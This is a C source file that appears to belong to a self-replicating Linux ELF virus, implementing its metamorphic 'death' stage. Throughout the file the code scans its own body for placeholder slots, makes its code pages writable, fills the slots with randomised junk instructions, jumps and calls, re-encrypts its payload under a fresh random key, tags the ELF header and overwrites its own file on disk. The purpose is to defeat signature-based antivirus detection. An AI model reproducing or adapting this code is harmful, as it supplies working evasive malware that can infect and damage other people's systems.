#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils.h"
#include "death.h"
#include "data.h"
#include "famine.h"
#include "syscall.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);
extern bool g_is_encrypted;
//extern int64_t g_key;
extern uint8_t g_key[KEY_SIZE];
extern void real_start(void);

#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
#define PAYLOAD_SIZE (uintptr_t)&end - (uintptr_t)&real_start
#define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start

int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
size_t __attribute__((section(".text#"))) g_nb_junk = 0;
uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
uint16_t __attribute__((section(".text#"))) g_ri = 0;

void junk_death(void);
void junk_famine(void);
void junk_war(void);
void junk_pestilence(void);

void junk_death(void) {
	char c = 'A';
	char *pc = &c;
	char **ppc = &pc;
	char ***pppc = &ppc;
	char *weird = *(char **)(*(char ***) &pppc);
	int result = *(int *)&weird * *(int *)&weird;
	for (int i = 0; i < 100; i++) {
		result += *(int *)&weird;
		if (result > 0) {
			result = *(int *)&weird;
		} else if (result < 0) {
			result = *(int *)&weird;
		}
	}
}

static inline uint8_t ft_nrand(void) {
	uint8_t rand = g_rand[g_ri];
	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
	return rand;
}

static int find_pattern(uint8_t *self, size_t offset) {
	if (self[offset] != PUSH_OP || self[offset + 1] != PUSH_RBX) {
		return 0;
	}

	offset += 2;

	for (size_t i = 0; i < NOPS_LEN; i += 3) {
		if (self[offset] != OP_64 || self[offset + 1] != XCHG || self[offset + 2] != RAX_RAX) {
			return 0;
		}
		offset += 3;
	}

	return (self[offset] == POP_RBX && self[offset + 1] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
			i += JUNK_LEN;
		}
	}
	g_nb_junk = j;
}

static uint8_t get_random_opcode(uint8_t rand) {
	const uint8_t opcodes[] = {
		OPCODE_XCHG,
		OPCODE_MOV,
		OPCODE_ADD_RM_R,
		OPCODE_ADD_R_RM,
		OPCODE_SUB_RM_R,
		OPCODE_SUB_R_RM,
		OPCODE_ADC,
		OPCODE_SBB,
		OPCODE_AND,
		OPCODE_OR,
		OPCODE_XOR,
		OPCODE_TEST,
		OPCODE_CMP,

		OPCODE_SHL,
	};

	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
}

/* patch_jmp: patch the jmp instruction with a random offset
 * example: we have an array of instructions_offsets = {0, 2, 4, 6, 8}
 * lets say the jmp instruction is at index 1 so instr_off[jmp_index] = 2
 * we patch randomly the jump to go to one of the next instructions
 * in this example jmp can jmp {0, 2, 4} (jmp 0 means it will jmp to the next instruction)
 */

static void patch_jmp(uint8_t *nop, uint8_t *instr_off, uint8_t instr_len, int8_t jmp_index) {

	int dest_i = ft_nrand() % (instr_len + 1);

	if (dest_i < instr_len) {
		*nop = (uint8_t)(instr_off[dest_i] - jmp_index - 2);
	} else {
		return;
	}
}

/* fill_nop: fill the nop array with random instructions 
 * nop: the array to fill
 * reg_1 and reg_2: the registers to use
 * file_off: the offset in the file relative to the start of the virus
 * instr_off: the array of offsets of the instructions
 * bytes_len: the number of bytes to fill
 */

#define SET_FLAG(var, flag) ((var) |= (flag))
#define UNSET_FLAG(var, flag) ((var) &= ~(flag))
#define IS_SET(var, flag) ((var) & (flag))
#define IS_UNSET(var, flag) (!((var) & (flag)))

#define LEA_FLAG (1 << 0)
#define CALL_FLAG (1 << 1)
#define JMP_FLAG (1 << 2)

static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {

	uint8_t nop_size = NOPS_LEN;
	uint8_t bytes_len = 0;

	uint8_t offset = 0;
	uint8_t instr_off[MAX_INSTR];
	uint8_t instr_count = 0;

	int8_t jmp_index = -1;

	uint32_t marker = 0;

	while (nop_size > 0) {
		bytes_len = (ft_nrand() % 4) + 2;

		if (nop_size < bytes_len) {
			bytes_len = nop_size;
		}

		if (bytes_len == 0) {
			break;
		}

		if (bytes_len == 5 && IS_SET(marker, CALL_FLAG)) {
			bytes_len = 4;
		}

		switch (bytes_len) {

			case 1:
				nop[offset] = 0x90;
				break;

			case 2:
				if (jmp_index == -1 && ft_nrand() % 2 == 0) {
					nop[offset] = 0xEB;
					nop[offset + 1] = 0x00;
					jmp_index = instr_count;
				} else {
					nop[offset] = get_random_opcode(ft_nrand());
					nop[offset + 1] = 0xC0 | reg_2 | (reg_1 << 3);
				}
				break;

			case 3:
				nop[offset] = 0x48;
				nop[offset + 1] = get_random_opcode(ft_nrand());
				nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
				break;

			case 4:
				if (IS_UNSET(marker, LEA_FLAG)) {
					nop[offset] = 0x48;
					nop[offset + 1] = 0x8D;
					nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
					nop[offset + 3] = ft_nrand();
					SET_FLAG(marker, LEA_FLAG);
				} else {
					nop[offset] = 0x48;
					nop[offset + 1] = 0x83;
					nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
					nop[offset + 3] = ft_nrand();
				}
				break;

			case 5: 
				if (IS_UNSET(marker, CALL_FLAG)) {

					nop[offset] = 0xE8;
					void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
					int size = sizeof(tab) / sizeof(tab[0]);

					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
					rel_offset = rel_offset - (file_off + 0x7 + offset);
					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));

					SET_FLAG(marker, CALL_FLAG);
				}

				break;

			default:
				break;
		}

		instr_off[instr_count++] = offset;
		offset += bytes_len;
		nop_size -= bytes_len;

	}

	/* prepare the jmp patch */

	instr_off[instr_count++] = NOPS_LEN;

	if (jmp_index != -1) {
		uint8_t *jmp_val = nop + instr_off[jmp_index] + 1;

		if (jmp_index + 1 < instr_count) {
			patch_jmp(jmp_val, &instr_off[jmp_index + 1], instr_count - jmp_index - 1, instr_off[jmp_index]);
		}
	}
}

static void gen_junk(uint8_t *rdm_junk, int file_off) {

	uint8_t reg_1 = 4;
	uint8_t reg_2 = 4;

	/* check is rsp */
	while (reg_1 == 4) reg_1 = ft_nrand() % 8;
	while (reg_2 == 4 || reg_2 == reg_1) reg_2 = ft_nrand() % 8;

	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
		reg_1 = 0;
		reg_2 = 1;
	} JUNK;

	rdm_junk[0] = PUSH_OP + reg_1;
	rdm_junk[1] = PUSH_OP + reg_2;

	fill_nop(rdm_junk + 2, reg_1, reg_2, file_off);

	rdm_junk[JUNK_LEN - 2] = POP_OP + reg_2;
	rdm_junk[JUNK_LEN - 1] = POP_OP + reg_1; JUNK;
}

static void replace_nop(uint8_t *self, int *junk_offsets) {

	for (size_t i = 0; i < g_nb_junk; i++) {

		uint8_t rdm_junk[JUNK_LEN];

		gen_junk(rdm_junk, junk_offsets[i]);

		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, uint8_t *key) {

	uint16_t dummy_offset	= (uintptr_t)&real_start - (uintptr_t)&_start;

	for (size_t i = 0; i < g_nb_junk; i++) {

		uint8_t rdm_junk[JUNK_LEN];

		gen_junk(rdm_junk, junk_offsets[i]);

		encrypt_offset(rdm_junk, JUNK_LEN, key, junk_offsets[i] - dummy_offset);

		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size; JUNK;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	getrandom(g_rand, RAND_SIZE, 0);

	if (g_junk_offsets[0] != 0) {
		return;
	}

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets); JUNK;
}

#define G_JUNK_OFF (uintptr_t)&g_junk_offsets - (uintptr_t)&_start
#define G_NB_JUNK_OFF (uintptr_t)&g_nb_junk - (uintptr_t)&_start

/* this and encrypt self is used only for the first run of the main prog (like fill_offsets) */
static void write_self_pos(uint8_t *entry) {

	uint8_t *junk = (uint8_t *)(entry + G_JUNK_OFF);
	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));

	*(uint8_t *)(entry + G_NB_JUNK_OFF) = g_nb_junk;
}

#define G_IS_ENCRYPTED_OFF (uintptr_t)&g_is_encrypted - (uintptr_t)&_start
#define G_KEY_OFF (uintptr_t)&g_key - (uintptr_t)&_start

static uint8_t* encrypt_self(uint8_t *entry) {

	/* encrypt self */
	//uintptr_t key_pos = (uintptr_t)&g_key - (uintptr_t)&_start;
	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
	getrandom(key, KEY_SIZE, 0);

	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);

	//uintptr_t is_encrypted = (uintptr_t)&g_is_encrypted - (uintptr_t)&_start;
	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
	//ft_memcpy(enc, (const void *)&(bool){true}, sizeof(bool));
	*enc = true; JUNK;


	return key;
}

int death(saved_vars_t *vars, file_t *file) {

	uint8_t *self = (uint8_t *)file->view.data; JUNK;
	char *self_name = file->abs_path;
	int fd = -1;

	uint8_t *entry = self + vars->start_offset;

	if (vars->is_encrypted) {
		replace_nop_encrypt(entry, g_junk_offsets, vars->key);
	} else {
		write_self_pos(entry);
		uint8_t *new_key = encrypt_self(entry);
		replace_nop_encrypt(entry, g_junk_offsets, new_key);
		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
	}

	if (unlink(self_name) == -1) {
		munmap(self, file->view.size);
		return -1;
	} JUNK;

	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
	if (fd == -1)
		return -1;

	if (write(fd, self, file->view.size) == -1) {
		close(fd);
		munmap(self, file->view.size);
		return -1;
	} JUNK;

	if (munmap(self, file->view.size) == -1) {
		close(fd);
		return -1;
	}

	close(fd);

	return 0;
}
